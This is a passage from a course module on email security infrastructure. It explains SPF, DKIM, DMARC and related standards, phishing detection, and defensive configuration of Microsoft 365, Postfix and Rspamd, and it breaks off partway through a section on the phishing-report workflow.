# 37 — Email Security Infrastructure

## Anti-Phishing, Authentication, and Gateway Operations

---

## Indice

1. [Architettura Email Security](#1-architettura-email-security)
2. [Email Authentication](#2-email-authentication)
3. [Anti-Phishing Technologies](#3-anti-phishing-technologies)
4. [Secure Email Gateways](#4-secure-email-gateways)
5. [Email Security Operations](#5-email-security-operations)
6. [Attacchi Email — Red Team Perspective](#6-attacchi-email--red-team-perspective)
7. [Business Email Compromise](#7-business-email-compromise)
8. [Email Forensics](#8-email-forensics)
9. [Microsoft 365 / Google Workspace Security](#9-microsoft-365--google-workspace-security)
10. [Laboratorio](#10-laboratorio)
11. [Crittografia Email — S/MIME e PGP](#11-crittografia-email--smime-e-pgp)
12. [Transport Layer Security — MTA-STS e DANE](#12-transport-layer-security--mta-sts-e-dane)
13. [Data Loss Prevention per Email](#13-data-loss-prevention-per-email)
14. [Archiviazione Email e Conformità Normativa](#14-archiviazione-email-e-conformità-normativa)
15. [Integrated Cloud Email Security — ICES](#15-integrated-cloud-email-security--ices)
16. [Security Awareness Training e Simulazioni Phishing](#16-security-awareness-training-e-simulazioni-phishing)
17. [Analisi Report DMARC e Monitoraggio Continuo](#17-analisi-report-dmarc-e-monitoraggio-continuo)
18. [SOAR e Automazione Incident Response Email](#18-soar-e-automazione-incident-response-email)

---

## 1. Architettura Email Security

### 1.1 SMTP Protocol Security Weaknesses

SMTP (Simple Mail Transfer Protocol, RFC 5321) was designed in 1982 for a cooperative, trusted network. It carries fundamental security weaknesses that all modern email security infrastructure must compensate for:

**No built-in authentication of sender identity.** The `MAIL FROM` envelope and the `From:` header are independent fields that any client can set arbitrarily. There is no protocol-level mechanism to validate that the claimed sender actually controls the sending domain. This is the root cause of email spoofing.

**No transport encryption by default.** SMTP transmits in cleartext on port 25. STARTTLS (RFC 3207) is opportunistic — a man-in-the-middle can strip the STARTTLS offer (STRIPTLS attack). MTA-STS (RFC 8461) and DANE (RFC 7672) attempt to enforce encryption but adoption remains incomplete.

**No message integrity verification.** The protocol provides no mechanism to detect if message content was altered in transit between hops. DKIM partially addresses this but only covers signed headers and body.

**Relay trust model.** Any MTA in the chain can modify headers, add headers, or alter routing. The `Received:` header chain is added by each hop but can be forged by any intermediate server.

**No delivery confirmation.** DSN (Delivery Status Notifications, RFC 3461) are optional and frequently disabled. Bounce messages can be weaponized (backscatter attacks).

**Command injection surface.** SMTP commands are text-based, making them susceptible to injection attacks, particularly in poorly implemented gateways that concatenate user input into SMTP dialogues.

### 1.2 Email Flow — MUA → MSA → MTA → MDA

Understanding the full email path is essential for placing security controls:

```
┌─────────┐    ┌─────────┐    ┌─────────────┐    ┌─────────┐    ┌─────────┐
│   MUA   │───▶│   MSA   │───▶│  MTA Chain  │───▶│   MDA   │───▶│   MUA   │
│ (Client)│    │ (Submit)│    │ (Transport) │    │(Deliver)│    │ (Client)│
└─────────┘    └─────────┘    └─────────────┘    └─────────┘    └─────────┘
   Port 587       Auth           Port 25          LMTP/LDA       IMAP/POP3
  (or 465)      Required        Relay Chain       Local           Port 993
```

**MUA (Mail User Agent):** The client application — Outlook, Thunderbird, Apple Mail, webmail interfaces. Security controls here include certificate validation, S/MIME or PGP enforcement, and phishing warnings rendered to the user.

**MSA (Mail Submission Agent):** Accepts mail from authenticated users on port 587 (SUBMISSION, RFC 6409) or port 465 (implicit TLS, RFC 8314). This is the first enforcement point — it should require SMTP AUTH (RFC 4954), enforce TLS, apply rate limiting, and perform basic content checks before accepting the message for relay.

**MTA (Mail Transfer Agent):** Relays messages between domains on port 25. This is where SPF, DKIM signing/verification, DMARC evaluation, and reputation checks occur. The MTA-to-MTA path is the most exposed segment of the chain.

**MDA (Mail Delivery Agent):** Delivers the message to the recipient's mailbox. This is where final content scanning, spam scoring, quarantine decisions, and mailbox-level rules execute. The MDA interfaces with the mail store (Maildir, mbox, Exchange database).

### 1.3 Security Layers

Modern email security operates at multiple layers simultaneously:

```
┌─────────────────────────────────────────────────────────────┐
│                    EDGE PROTECTION                            │
│  DNS-based: SPF, DKIM, DMARC, MTA-STS, DANE                │
│  IP reputation, RBL/DNSBL, connection-level rate limiting    │
│  Geo-blocking, TLS enforcement                              │
├─────────────────────────────────────────────────────────────┤
│                    GATEWAY LAYER                              │
│  Secure Email Gateway (SEG): content inspection,            │
│  URL rewriting, attachment sandboxing, impersonation        │
│  detection, DLP scanning, encryption policy                 │
├─────────────────────────────────────────────────────────────┤
│                    MAILBOX LAYER                              │
│  Post-delivery scanning, ZAP (Zero-hour Auto Purge),       │
│  mailbox-level rules, sensitivity labels, encryption        │
│  at rest, journal rules, retention policies                 │
├─────────────────────────────────────────────────────────────┤
│                    ENDPOINT LAYER                             │
│  Client-side phishing detection, link protection at         │
│  time of click, attachment opening in sandbox, user         │
│  awareness training, report phishing button                 │
└─────────────────────────────────────────────────────────────┘
```

### 1.4 Email Threat Landscape

**Business Email Compromise (BEC):** Socially engineered attacks targeting business processes — payment redirection, data theft, gift card fraud. Average loss per incident exceeds $125,000 (FBI IC3 2023). No malware, no malicious links — pure social engineering makes these extremely difficult to detect with traditional content inspection.

**Phishing:** Mass-distributed credential harvesting campaigns using fake login pages. Typically targets cloud services (Microsoft 365, Google Workspace), banking, and SaaS platforms. Volume is enormous — over 1.2 billion phishing emails sent daily (Cofense 2024).

**Spear-Phishing:** Targeted phishing against specific individuals using personalized content derived from OSINT. Higher success rate (30%+ click-through versus 3% for generic phishing) due to contextual relevance.

**Whaling:** Spear-phishing specifically targeting C-level executives, board members, or high-value targets. Attacks leverage public information about executive activities, travel, and business relationships.

**Credential Harvesting:** Phishing campaigns specifically designed to capture authentication credentials. Modern variants use adversary-in-the-middle (AitM) proxies to capture both credentials and session tokens, bypassing MFA.

**Malware Delivery:** Emails delivering malicious payloads via attachments (weaponized Office documents, ISO files, LNK files, OneNote files) or links to malware hosting. Initial access brokers sell this access to ransomware operators.

**Callback Phishing (BazarCall):** Emails containing no links or attachments — only a phone number. Victims call the number and are socially engineered into installing remote access tools or running malicious scripts.

**QR Code Phishing (Quishing):** Malicious URLs embedded in QR codes within email bodies or attachments. Bypasses URL scanning because the malicious URL is encoded in an image, not as a clickable link in the message body.

---

## 2. Email Authentication

### 2.1 SPF — Sender Policy Framework

SPF (RFC 7208) allows domain owners to declare which IP addresses are authorized to send email on behalf of their domain. The receiving MTA checks the `MAIL FROM` envelope sender against the SPF record of the domain.

#### SPF Record Syntax

```dns
v=spf1 [mechanisms] [modifiers]
```

#### Mechanisms

| Mechanism | Description | Example |
|-----------|-------------|---------|
| `ip4` | IPv4 address or CIDR range | `ip4:203.0.113.0/24` |
| `ip6` | IPv6 address or CIDR range | `ip6:2001:db8::/32` |
| `a` | A/AAAA record of domain | `a:mail.example.com` |
| `mx` | MX record of domain | `mx` |
| `include` | Include another domain's SPF | `include:_spf.google.com` |
| `exists` | DNS lookup exists | `exists:%{i}._spf.example.com` |
| `all` | Match everything (terminal) | `-all` |

#### Qualifiers

| Qualifier | Result | Action |
|-----------|--------|--------|
| `+` (default) | Pass | Accept |
| `-` | Fail (hard fail) | Reject |
| `~` | SoftFail | Accept but mark |
| `?` | Neutral | No policy |

#### Production SPF Records

Microsoft 365:
```dns
example.com. IN TXT "v=spf1 include:spf.protection.outlook.com -all"
```

Google Workspace:
```dns
example.com. IN TXT "v=spf1 include:_spf.google.com -all"
```

Complex multi-provider setup:
```dns
example.com. IN TXT "v=spf1 include:spf.protection.outlook.com include:sendgrid.net include:_spf.salesforce.com ip4:203.0.113.10 -all"
```

#### DNS Lookup Limit

SPF is limited to 10 DNS lookups (mechanisms that cause lookups: `include`, `a`, `mx`, `exists`, `redirect`). Exceeding this limit causes a `permerror` result, which many receivers treat as a failure.

The `ip4` and `ip6` mechanisms do NOT count against the lookup limit. The `all` mechanism does NOT count.

**Counting example:**
```dns
v=spf1 include:_spf.google.com include:spf.protection.outlook.com 
       include:sendgrid.net include:amazonses.com a mx -all
```
- `include:_spf.google.com` → 1 (plus nested lookups inside Google's record)
- `include:spf.protection.outlook.com` → 1 (plus nested)
- `include:sendgrid.net` → 1 (plus nested)
- `include:amazonses.com` → 1 (plus nested)
- `a` → 1
- `mx` → 1
- Total: 6 + nested lookups from includes

Google's `_spf.google.com` currently resolves to 3 additional includes, consuming 4 total lookups by itself.

#### SPF Flattening

SPF flattening resolves all `include` mechanisms to their underlying IP addresses at publish time, eliminating nested lookups:

```dns
# Before flattening (5+ lookups)
v=spf1 include:_spf.google.com include:spf.protection.outlook.com -all

# After flattening (0 lookups — all ip4/ip6)
v=spf1 ip4:209.85.128.0/17 ip4:74.125.0.0/16 ip4:64.18.0.0/20 
       ip4:207.126.144.0/20 ip4:40.92.0.0/15 ip4:40.107.0.0/16 
       ip4:52.100.0.0/14 -all
```

**Risks of flattening:**
- Provider IP ranges change without notice — stale records cause legitimate mail to fail SPF
- Requires automated monitoring and re-flattening (tools: dmarcian SPF surveyor, AutoSPF)
- TXT record length limits (255 chars per string, 512 bytes total recommended) may require multiple records or creative splitting

#### SPF Macros

SPF macros enable dynamic per-sender lookups:

```dns
v=spf1 exists:%{i}._spf.example.com -all
```

Macro variables:
- `%{s}` — sender (MAIL FROM)
- `%{l}` — local-part of sender
- `%{o}` — domain of sender
- `%{d}` — current domain being checked
- `%{i}` — connecting IP address
- `%{h}` — HELO/EHLO domain

Macros are powerful for per-IP allowlisting but rarely used due to complexity and debugging difficulty.

### 2.2 DKIM — DomainKeys Identified Mail

DKIM (RFC 6376) provides message integrity and domain authentication by cryptographically signing email headers and body. The receiving server retrieves the public key from DNS and verifies the signature.

#### Key Generation

Generate a 2048-bit RSA key pair:
```bash
# Generate private key
openssl genrsa -out dkim_private.pem 2048

# Extract public key
openssl rsa -in dkim_private.pem -pubout -outform DER 2>/dev/null | \
  openssl base64 -A > dkim_public.txt

# Format for DNS TXT record
echo "v=DKIM1; k=rsa; p=$(cat dkim_public.txt)"
```

Ed25519 keys (RFC 8463) — smaller, faster, increasingly supported:
```bash
openssl genpkey -algorithm Ed25519 -out dkim_ed25519_private.pem
openssl pkey -in dkim_ed25519_private.pem -pubout -outform DER | \
  openssl base64 -A > dkim_ed25519_public.txt
```

#### DNS Record (Selector)

```dns
selector1._domainkey.example.com. IN TXT "v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA..."
```

The selector allows multiple signing keys per domain (e.g., different selectors for different mail streams or during key rotation).

#### Selector Rotation

Best practice: rotate DKIM keys every 90 days. Rotation procedure:

1. Generate new key pair with new selector name (e.g., `s202601`)
2. Publish new public key to DNS with new selector
3. Wait for DNS propagation (TTL + buffer)
4. Configure MTA to sign with new selector
5. Keep old selector published for 7+ days (in-flight messages)
6. Remove old selector from DNS

#### Header Canonicalization

DKIM defines two canonicalization algorithms for handling whitespace and case:

- **simple** — no modification; any whitespace change breaks the signature
- **relaxed** — converts header names to lowercase, reduces whitespace sequences to single space, removes trailing whitespace

Typical configuration: `c=relaxed/relaxed` (header/body canonicalization).

#### Body Hash

The `bh=` tag in the DKIM signature contains the base64-encoded hash of the canonicalized message body (truncated to `l=` length if specified). This ensures body integrity.

**Warning:** The `l=` (body length) tag is dangerous — it allows appending content to the body without invalidating the signature. Never use `l=` in signing configuration.

#### DKIM-Signature Header Example

```
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=example.com; s=selector1; t=1706745600;
  h=from:to:subject:date:message-id:content-type:mime-version;
  bh=2jUSOH9NhtVGCQWNr9BrIAPreKQjO6Sn7XIkfJVOzv8=;
  b=LjIk3EWE3yX4Q0y4T0pmU7xGbLWJnOayPFfBe+ePfQmr...
```

Key tags:
- `v=1` — DKIM version
- `a=rsa-sha256` — signing algorithm
- `d=example.com` — signing domain
- `s=selector1` — selector for DNS lookup
- `t=1706745600` — signature timestamp
- `h=` — signed headers (order matters)
- `bh=` — body hash
- `b=` — signature data

#### DKIM Replay Attacks

An attacker can take a legitimately DKIM-signed message and re-send it to different recipients. The signature remains valid because it covers original headers and body. Mitigations:

- Sign the `Date:` header and reject messages with old timestamps
- Use `x=` (signature expiration) tag — e.g., expire after 7 days
- Rate-limit outbound messages to prevent mass replay
- Monitor DMARC aggregate reports for unexpected volume spikes

### 2.3 DMARC — Domain-based Message Authentication

DMARC (RFC 7489) ties SPF and DKIM together with alignment requirements and provides a reporting mechanism for domain owners to monitor authentication results.

#### DMARC Record

```dns
_dmarc.example.com. IN TXT "v=DMARC1; p=reject; sp=reject; adkim=s; aspf=s; rua=mailto:dmarc-agg@example.com; ruf=mailto:dmarc-forensic@example.com; pct=100; fo=1"
```

#### Policy Tags

| Tag | Description | Values |
|-----|-------------|--------|
| `p` | Policy for organizational domain | `none`, `quarantine`, `reject` |
| `sp` | Policy for subdomains | `none`, `quarantine`, `reject` |
| `adkim` | DKIM alignment mode | `r` (relaxed), `s` (strict) |
| `aspf` | SPF alignment mode | `r` (relaxed), `s` (strict) |
| `pct` | Percentage of messages to apply policy | 0-100 |
| `rua` | Aggregate report URI | `mailto:` or `https://` |
| `ruf` | Forensic report URI | `mailto:` or `https://` |
| `fo` | Failure reporting options | `0`, `1`, `d`, `s` |
| `ri` | Reporting interval (seconds) | Default 86400 |

#### Alignment

DMARC requires that at least one of SPF or DKIM passes AND aligns with the `From:` header domain:

- **SPF alignment:** The domain in `MAIL FROM` must match the `From:` header domain
- **DKIM alignment:** The `d=` domain in the DKIM signature must match the `From:` header domain

Strict alignment (`s`): exact domain match required.
Relaxed alignment (`r`): organizational domain match sufficient (subdomain of `From:` domain is acceptable).

#### RUA Reporting (Aggregate)

Aggregate reports are XML documents sent daily by receiving domains, containing:
- Source IPs sending mail for your domain
- SPF and DKIM authentication results per source
- DMARC disposition (none/quarantine/reject) per message group
- Volume counts

Example aggregate report structure:
```xml
<feedback>
  <report_metadata>
    <org_name>google.com</org_name>
    <date_range><begin>1706659200</begin><end>1706745600</end></date_range>
  </report_metadata>
  <policy_published>
    <domain>example.com</domain>
    <p>reject</p>
    <sp>reject</sp>
    <adkim>s</adkim>
    <aspf>s</aspf>
  </policy_published>
  <record>
    <row>
      <source_ip>203.0.113.10</source_ip>
      <count>142</count>
      <policy_evaluated>
        <disposition>none</disposition>
        <dkim>pass</dkim>
        <spf>pass</spf>
      </policy_evaluated>
    </row>
  </record>
</feedback>
```

#### RUF Reporting (Forensic)

Forensic reports contain copies (or redacted copies) of individual messages that failed DMARC. Privacy concerns have led many providers (Google, Microsoft) to not send RUF reports or to heavily redact them.

#### Gradual Enforcement Rollout

Never jump directly to `p=reject`. Follow this progression:

```
Phase 1 (2-4 weeks):  p=none; rua=mailto:...         → Monitor only
Phase 2 (2-4 weeks):  p=quarantine; pct=10; rua=...  → Quarantine 10%
Phase 3 (2-4 weeks):  p=quarantine; pct=50; rua=...  → Quarantine 50%
Phase 4 (2-4 weeks):  p=quarantine; pct=100; rua=... → Quarantine all
Phase 5 (final):      p=reject; pct=100; rua=...     → Reject all failures
```

At each phase, analyze aggregate reports to identify legitimate senders failing authentication and fix their SPF/DKIM configuration before increasing enforcement.

#### Subdomain Policy

The `sp=` tag defines policy for subdomains. Critical consideration: if you only set `p=reject` without `sp=reject`, attackers can spoof `anything.example.com` and bypass your domain policy.

```dns
_dmarc.example.com. IN TXT "v=DMARC1; p=reject; sp=reject; ..."
```

For subdomains that must send mail with their own policy:
```dns
_dmarc.marketing.example.com. IN TXT "v=DMARC1; p=quarantine; ..."
```

### 2.4 ARC — Authenticated Received Chain

ARC (RFC 8617) preserves authentication results across indirect mail flows (mailing lists, forwarding services) where SPF and DKIM typically break.

When an intermediary (mailing list, forwarding server) modifies a message:
1. The intermediary verifies the current authentication state
2. It seals the current authentication results in an `ARC-Authentication-Results` header
3. It signs the seal with its own key (`ARC-Message-Signature`, `ARC-Seal`)
4. The final receiver can evaluate the ARC chain to determine if the original message was legitimate

ARC headers:
```
ARC-Seal: i=1; a=rsa-sha256; d=lists.example.org; s=arc; ...
ARC-Message-Signature: i=1; a=rsa-sha256; d=lists.example.org; ...
ARC-Authentication-Results: i=1; lists.example.org;
  dkim=pass header.d=sender.com;
  spf=pass smtp.mailfrom=sender.com;
  dmarc=pass header.from=sender.com
```

ARC is trusted based on the reputation of the intermediary. Microsoft 365 and Google maintain lists of trusted ARC sealers.

### 2.5 BIMI — Brand Indicators for Message Identification

BIMI (RFC in draft, widely deployed) displays a brand's logo next to authenticated emails in supporting mail clients, providing visual assurance to recipients.

Requirements:
1. DMARC at `p=quarantine` or `p=reject` (enforcement mode)
2. A VMC (Verified Mark Certificate) from a qualifying certificate authority (DigiCert, Entrust)
3. The logo must be a trademarked SVG Tiny PS format image

DNS record:
```dns
default._bimi.example.com. IN TXT "v=BIMI1; l=https://example.com/brand/logo.svg; a=https://example.com/brand/vmc.pem"
```

BIMI provides no direct security benefit but creates a strong incentive for organizations to deploy DMARC enforcement, which is the real security win.

---

## 3. Anti-Phishing Technologies

### 3.1 URL Analysis

#### Reputation-Based Checking

Every URL in an email is extracted and checked against reputation databases:

- Real-time blocklists (Google Safe Browsing, Microsoft SmartScreen, Phishtank)
- Domain age — newly registered domains (< 30 days) flagged
- WHOIS privacy usage patterns
- Historical hosting patterns
- Certificate transparency logs for suspicious domains
- URL shortener expansion and resolution

#### Sandbox Detonation

URLs are followed in an isolated sandbox environment to observe:
- Redirect chains (multi-hop redirects to evade reputation checks)
- Final landing page content (credential harvesting form detection)
- JavaScript execution behavior (fingerprinting, evasion, payload delivery)
- Drive-by download attempts
- Browser exploit deployment

#### Time-of-Click URL Rewriting

URLs are replaced with a gateway URL that performs checks at the moment of click, not just at delivery time:

Original: `https://malicious-site.com/login`
Rewritten: `https://urldefense.proofpoint.com/v2/url?u=https-3A__malicious-2Dsite.com_login&d=...`

Or (Microsoft Safe Links):
`https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fmalicious-site.com...`

This defeats time-delayed attacks where the URL is clean at delivery but becomes malicious hours later.

### 3.2 Attachment Sandboxing

#### Detonation Environments

Attachments are executed in isolated virtual machines to observe malicious behavior:

- Windows VMs with Office installations for document detonation
- Multiple OS versions and patch levels
- Real user profiles with browsing history, documents, and applications (to defeat sandbox-aware malware)
- Network simulation to capture C2 communication attempts

#### Behavioral Analysis Indicators

- Process creation chains (Office → cmd.exe → powershell.exe)
- Registry modifications
- File system changes (dropped executables, persistence mechanisms)
- Network connections to non-standard ports or suspicious domains
- API calls indicating credential theft, screen capture, or keylogging
- Memory injection techniques
- Delayed execution (sleep timers to outlast sandbox analysis windows)

#### File Type Coverage

High-risk attachment types requiring sandboxing:
- Office documents with macros (.docm, .xlsm, .pptm)
- PDF files (JavaScript, embedded objects, URI actions)
- Archive files (.zip, .7z, .rar) — especially password-protected
- ISO/IMG disk images (mount and auto-execute)
- LNK shortcuts (command execution via target path)
- OneNote files (.one) with embedded objects
- HTML files (smuggled payloads via JavaScript)
- SVG files (embedded scripts)

### 3.3 Impersonation Detection

#### Display Name Spoofing

Attackers set the display name to match a trusted contact:
```
From: "CEO John Smith" <random@attacker.com>
```

Detection approaches:
- Compare display name against internal directory (GAL)
- Flag external emails using internal employee names
- Flag display names matching VIP/executive list
- Pattern matching for common impersonation formats

#### Domain Similarity (Cousin Domains)

Detection of lookalike domains:
- `examp1e.com` (character substitution)
- `example-corp.com` (addition)
- `exarnple.com` (homoglyph — `rn` looks like `m`)
- `example.co` (TLD variation)
- `exmple.com` (character omission)
- `exampel.com` (transposition)

Algorithms: Levenshtein distance, Damerau-Levenshtein, keyboard proximity scoring, visual similarity scoring.

#### Homoglyph Detection

Unicode characters that visually resemble ASCII characters:
- Cyrillic `а` (U+0430) vs Latin `a` (U+0061)
- Cyrillic `е` (U+0435) vs Latin `e` (U+0065)
- Cyrillic `о` (U+043E) vs Latin `o` (U+006F)
- Greek `ο` (U+03BF) vs Latin `o`

IDN homograph attack detection requires normalizing domain names and comparing against a confusables database (Unicode TR39).

### 3.4 Email Header Analysis for Spoofing

Key headers to analyze for spoofing indicators:

```
Authentication-Results: mx.google.com;
  dkim=fail (body hash did not verify) header.d=example.com;
  spf=softfail (google.com: domain of transitioning noreply@example.com 
    does not designate 192.0.2.1 as permitted sender);
  dmarc=fail (p=NONE sp=NONE dis=NONE) header.from=example.com
```

Red flags:
- `Authentication-Results` showing failures for the claimed sending domain
- Mismatch between `From:` header and `Return-Path:` / `MAIL FROM`
- `Received:` headers showing unexpected origin servers
- `Reply-To:` pointing to a different domain than `From:`
- `X-Originating-IP:` from unexpected geolocation
- Missing or inconsistent `Message-ID:` formatting

### 3.5 Machine Learning for Phishing Detection

Modern anti-phishing engines use ML models trained on:

**Content features:**
- Urgency language patterns ("immediate action required", "account suspended")
- Credential request indicators ("verify your account", "confirm your password")
- Financial lure patterns ("payment failed", "invoice attached")
- Linguistic anomalies relative to sender's historical communication style

**Structural features:**
- HTML/text ratio
- Number and type of embedded links
- Form elements in email body
- Image-to-text ratio
- Obfuscation techniques (zero-width characters, invisible text)
- Base64 encoded content blocks

**Behavioral features:**
- Sender communication patterns (frequency, timing, recipients)
- Anomalous recipient targeting (new contacts, unusual groups)
- Sending infrastructure changes
- Volume spikes

**NLP-based approaches:**
- Transformer models for contextual understanding
- Intent classification (legitimate business vs social engineering)
- Writing style analysis (BEC detection via stylometric comparison)
- Multi-language phishing detection

### 3.6 QR Code Phishing — Quishing Detection

QR codes in emails bypass traditional URL scanning because the malicious URL is encoded in an image rather than as text in the HTML body.

Detection methods:
- Image scanning with QR code decoders on all embedded images and attachments
- Extracted URLs from QR codes fed into standard URL analysis pipeline
- Behavioral analysis: legitimate business communication rarely uses QR codes for authentication
- Policy-based blocking: flag emails containing QR codes from external senders directing to credential pages
- OCR-assisted detection for QR codes embedded in PDF attachments

---

## 4. Secure Email Gateways

### 4.1 Microsoft Defender for Office 365

#### Safe Links

URL rewriting with time-of-click protection:

```powershell
# Create Safe Links policy
New-SafeLinksPolicy -Name "Corporate Safe Links" `
    -IsEnabled $true `
    -ScanUrls $true `
    -EnableForInternalSenders $true `
    -DeliverMessageAfterScan $true `
    -DisableUrlRewrite $false `
    -EnableOrganizationBranding $true `
    -DoNotTrackUserClicks $false `
    -DoNotAllowClickThrough $true

# Apply to all users
New-SafeLinksRule -Name "All Users Safe Links" `
    -SafeLinksPolicy "Corporate Safe Links" `
    -RecipientDomainIs "example.com" `
    -Priority 0
```

#### Safe Attachments

Attachment detonation in sandbox:

```powershell
# Create Safe Attachments policy
New-SafeAttachmentPolicy -Name "Corporate Safe Attachments" `
    -Enable $true `
    -Action "DynamicDelivery" `
    -ActionOnError $true `
    -Redirect $true `
    -RedirectAddress "secops@example.com"

# DynamicDelivery: delivers message body immediately,
# replaces attachment with placeholder until scanning completes
```

Action options:
- `Block` — quarantine the entire message
- `Replace` — deliver message, remove attachment, replace with notification
- `DynamicDelivery` — deliver body immediately, scan attachment asynchronously
- `Monitor` — deliver everything, log results only (not recommended for production)

#### Anti-Phishing Policies

```powershell
# Configure anti-phishing policy
Set-AntiPhishPolicy -Identity "Office365 AntiPhish Default" `
    -EnableMailboxIntelligence $true `
    -EnableMailboxIntelligenceProtection $true `
    -MailboxIntelligenceProtectionAction "MoveToJmf" `
    -EnableSimilarUsersSafetyTips $true `
    -EnableSimilarDomainsSafetyTips $true `
    -EnableUnusualCharactersSafetyTips $true `
    -PhishThresholdLevel 3 `
    -EnableTargetedUserProtection $true `
    -TargetedUsersToProtect "CEO;ceo@example.com","CFO;cfo@example.com" `
    -TargetedUserProtectionAction "Quarantine" `
    -EnableTargetedDomainsProtection $true `
    -TargetedDomainsToProtect "example.com","partner.com" `
    -TargetedDomainProtectionAction "Quarantine" `
    -EnableFirstContactSafetyTips $true `
    -EnableViaTag $true `
    -EnableUnauthenticatedSender $true
```

#### AIR — Automated Investigation and Response

AIR automatically investigates alerts and recommends or executes remediation:

1. Trigger: user reports phishing, ZAP triggers, alert policy fires
2. Investigation: AIR examines the message, sender, URLs, attachments, and related messages
3. Correlation: finds similar messages sent to other recipients
4. Recommendation: suggests remediation actions (delete messages, block sender, reset passwords)
5. Execution: with auto-remediation enabled, executes approved actions

### 4.2 Proofpoint

#### TAP — Targeted Attack Protection

Proofpoint's sandboxing technology analyzes URLs and attachments:
- Predictive URL defense — blocks URLs before they become active threats
- Attachment sandboxing with multi-stage analysis
- Supplier risk scoring based on compromised vendor communication patterns

#### Email Fraud Defense (EFD)

DMARC monitoring and enforcement platform:
- Automated SPF/DKIM configuration guidance
- Lookalike domain detection and takedown
- Supply chain risk visibility

#### TRAP — Threat Response Auto-Pull

Post-delivery remediation:
- Removes delivered messages matching IOCs
- Quarantines forwarded copies
- Integrates with SOAR platforms for automated response workflows

### 4.3 Mimecast

#### Targeted Threat Protection

- URL Protect: multi-layer URL analysis with time-of-click scanning
- Attachment Protect: sandbox detonation and static analysis
- Impersonation Protect: ML-based display name and domain similarity detection
- Internal Email Protect: scans internal-to-internal email for lateral phishing from compromised accounts

### 4.4 Barracuda

#### Advanced Threat Protection (ATP)

- Multi-layer scanning: virus scanning, sandboxing, static analysis
- Link Protection: real-time URL scanning at click time
- Email threat scanner for retroactive analysis of already-delivered mail

#### Incident Response

- Automated threat hunting across mailboxes
- One-click remediation (delete from all mailboxes)
- User-reported phishing automated analysis

### 4.5 Open-Source: Rspamd + ClamAV + Postfix

#### Architecture

```
Internet → Postfix (MTA) → Rspamd (milter) → ClamAV → Delivery
                              ↓
                         Redis (cache)
                              ↓
                     Fuzzy storage + Bayes
```

#### Postfix Hardening Configuration

```bash
# /etc/postfix/main.cf — Security-relevant settings

# TLS enforcement
smtpd_tls_cert_file = /etc/letsencrypt/live/mail.example.com/fullchain.pem
smtpd_tls_key_file = /etc/letsencrypt/live/mail.example.com/privkey.pem
smtpd_tls_security_level = may
smtpd_tls_auth_only = yes
smtpd_tls_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1
smtpd_tls_mandatory_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1
smtpd_tls_mandatory_ciphers = high
tls_high_cipherlist = ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384

smtp_tls_security_level = dane
smtp_dns_support_level = dnssec
smtp_tls_mandatory_protocols = !SSLv2, !SSLv3, !TLSv1, !TLSv1.1

# Rate limiting and connection controls
smtpd_client_connection_rate_limit = 30
smtpd_client_message_rate_limit = 60
smtpd_client_recipient_rate_limit = 120
smtpd_error_sleep_time = 5s
smtpd_soft_error_limit = 3
smtpd_hard_error_limit = 5

# Recipient verification
smtpd_recipient_restrictions =
    permit_mynetworks,
    permit_sasl_authenticated,
    reject_unauth_destination,
    reject_invalid_hostname,
    reject_non_fqdn_hostname,
    reject_non_fqdn_sender,
    reject_non_fqdn_recipient,
    reject_unknown_sender_domain,
    reject_unknown_recipient_domain,
    reject_rbl_client zen.spamhaus.org,
    reject_rbl_client bl.spamcop.net,
    reject_rhsbl_sender dbl.spamhaus.org,
    check_policy_service unix:private/policyd-spf

# Milter integration (Rspamd)
smtpd_milters = inet:localhost:11332
non_smtpd_milters = $smtpd_milters
milter_default_action = accept
milter_protocol = 6

# Header controls
header_checks = regexp:/etc/postfix/header_checks
mime_header_checks = regexp:/etc/postfix/mime_header_checks

# Size limit
message_size_limit = 26214400

# Disable VRFY and EXPN
disable_vrfy_command = yes
smtpd_helo_required = yes
```

#### Rspamd Configuration

```lua
-- /etc/rspamd/local.d/dkim_signing.conf
enabled = true;
path = "/var/lib/rspamd/dkim/$domain.$selector.key";
selector = "dkim202601";
allow_envfrom_empty = true;
allow_hdrfrom_mismatch = false;
allow_hdrfrom_multiple = false;
allow_username_mismatch = false;
sign_authenticated = true;
sign_local = true;
use_domain = "header";
use_esld = true;
```

```lua
-- /etc/rspamd/local.d/dmarc.conf
enabled = true;
reporting = true;
send_reports = true;
report_domain = "example.com";
report_org = "Example Corp";
actions = {
    quarantine = "add_header";
    reject = "reject";
};
```

```lua
-- /etc/rspamd/local.d/phishing.conf
enabled = true;
openphish_enabled = true;
phishtank_enabled = true;
phishtank_map = "https://rspamd.com/phishtank/online-valid.json.zst";
```

```lua
-- /etc/rspamd/local.d/antivirus.conf
clamav {
    action = "reject";
    type = "clamav";
    servers = "127.0.0.1:3310";
    scan_mime_parts = true;
    scan_text_mime = true;
    scan_image_mime = true;
    max_size = 26214400;
}
```

---

## 5. Email Security Operations

### 5.1 Quarantine Management

Effective quarantine operations require:

**Categorization:**
- Malware-containing messages → automatic permanent deletion after 7 days
- Phishing → held for SOC review, never auto-released
- Spam → user-accessible quarantine with self-service release
- Policy violations (DLP) → compliance team review required
- Bulk mail → user-configurable preferences

**Retention and Review Cadence:**
- SOC reviews quarantine daily for false positives
- Phishing quarantine: review within 4 hours during business hours
- Automated DMARC rejection notifications sent to domain owners
- Metrics: false positive rate target < 0.01%

**PowerShell — M365 Quarantine Management:**

```powershell
# Review quarantined messages
Get-QuarantineMessage -Type Phish -StartDate (Get-Date).AddDays(-7) | 
    Select-Object ReceivedTime, SenderAddress, Subject, QuarantineReason |
    Sort-Object ReceivedTime -Descending

# Release false positive from quarantine
Release-QuarantineMessage -Identity "<message-id>" -ReleaseToAll

# Bulk delete confirmed phishing from quarantine
Get-QuarantineMessage -Type Phish -SenderAddress "attacker@malicious.com" | 
    Delete-QuarantineMessage -Confirm:$false

# Export quarantine report
Get-QuarantineMessage -StartDate (Get-Date).AddDays(-30) |
    Group-Object QuarantineReason |
    Select-Object Name, Count |
    Export-Csv "C:\Reports\QuarantineReport.csv" -NoTypeInformation
```

### 5.2 User-Reported Phishing Workflow

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
